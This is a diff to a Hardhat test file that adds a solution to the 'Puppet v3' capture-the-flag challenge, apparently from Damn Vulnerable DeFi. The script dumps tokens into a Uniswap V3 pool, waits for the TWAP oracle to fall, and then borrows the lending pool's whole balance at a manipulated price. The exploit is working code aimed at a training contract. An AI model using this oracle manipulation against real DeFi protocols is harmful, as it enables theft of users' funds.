@@ -5,6 +5,7 @@ const { time, setBalance } = require("@nomicfoundation/hardhat-network-helpers")
 const positionManagerJson = require("@uniswap/v3-periphery/artifacts/contracts/NonfungiblePositionManager.sol/NonfungiblePositionManager.json");
 const factoryJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Factory.sol/UniswapV3Factory.json");
 const poolJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Pool.sol/UniswapV3Pool.json");
+const routerJson = require("@uniswap/swap-router-contracts/artifacts/contracts/SwapRouter02.sol/SwapRouter02.json");
 
 // See https://github.com/Uniswap/v3-periphery/blob/5bcdd9f67f9394f3159dad80d0dd01d37ca08c66/test/shared/encodePriceSqrt.ts
 const bn = require("bignumber.js");
@@ -21,7 +22,7 @@ describe("[Challenge] Puppet v3", function () {
     let initialBlockTimestamp;
 
     /** SET RPC URL HERE */
-    const MAINNET_FORKING_URL = "";
+    const MAINNET_FORKING_URL = require("./rpc-url.json").RPC_URL;
 
     // Initial liquidity amounts for Uniswap v3 pool
     const UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100n * 10n ** 18n;
@@ -81,7 +82,7 @@ describe("[Challenge] Puppet v3", function () {
 
         let uniswapPoolAddress = await uniswapFactory.getPool(weth.address, token.address, FEE);
         uniswapPool = new ethers.Contract(uniswapPoolAddress, poolJson.abi, deployer);
-        await uniswapPool.increaseObservationCardinalityNext(40);
+        await uniswapPool.increaseObservationCardinalityNext(40); // default is way smaller -> meaning now the history of prices is way longer
 
         // Deployer adds liquidity at current price to Uniswap V3 exchange
         await weth.approve(uniswapPositionManager.address, ethers.constants.MaxUint256);
@@ -132,6 +133,67 @@ describe("[Challenge] Puppet v3", function () {
 
     it("Execution", async function () {
         /** CODE YOUR SOLUTION HERE */
+        const getQuote = async (amount, print = true) => {
+            const quote = await lendingPool.calculateDepositOfWETHRequired(amount);
+            if (print) console.log(`Quote of ${ethers.utils.formatEther(amount)} DVT is ${ethers.utils.formatEther(quote)} WETH\n`);
+            return quote;
+        };
+
+        const logBalances = async (name, address) => {
+            console.log(`Logging balances for '${name}'...`);
+            console.log("- DVT:", ethers.utils.formatEther(await token.balanceOf(address)));
+            console.log("- WETH:", ethers.utils.formatEther(await weth.balanceOf(address)));
+            console.log("- ETH:", ethers.utils.formatEther(await ethers.provider.getBalance(address)));
+        };
+
+        console.log("~~~ Initial balances ~~~");
+        await logBalances("Player", player.address);
+        await logBalances("Lending Pool", lendingPool.address);
+        await logBalances("Uniswap Pool", uniswapPool.address);
+        console.log("~~~~~~~~~~~~~~~~~~~~~~~~\n");
+
+        const uniswapRouterAddress = "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45";
+        const uniswapRouter = new ethers.Contract(uniswapRouterAddress, routerJson.abi, player);
+
+        await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
+
+        // Swap player tokens for as much WETH as possible, in order to have only DVT in pool, which should devalue it.
+        await uniswapRouter.exactInputSingle(
+            [
+                token.address,
+                weth.address,
+                3000, // fee
+                player.address,
+                PLAYER_INITIAL_TOKEN_BALANCE, // 110 DVT
+                0,
+                0
+            ],
+            {
+                gasLimit: 1_000_000
+            }
+        );
+
+        console.log("~~~ After the swap ~~~");
+        await logBalances("Player", player.address);
+        await logBalances("Lending Pool", lendingPool.address);
+        await logBalances("Uniswap Pool", uniswapPool.address);
+        console.log("~~~~~~~~~~~~~~~~~~~~~~\n");
+
+        // Some time is necessary to reduce the price using the new weight (15s left to exploit (look at success condition))
+        await time.increase(100);
+
+        // Get new quote to see how much is DVT worth in WETH after our huge swap
+        const quote = await getQuote(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+
+        // Borrow funds
+        await weth.connect(player).approve(lendingPool.address, quote);
+        await lendingPool.connect(player).borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+
+        console.log("~~~ After borrowing ~~~");
+        await logBalances("Player", player.address);
+        await logBalances("Lending Pool", lendingPool.address);
+        await logBalances("Uniswap Pool", uniswapPool.address);
+        console.log("~~~~~~~~~~~~~~~~~~~~~~~\n");
     });
 
     after(async function () {
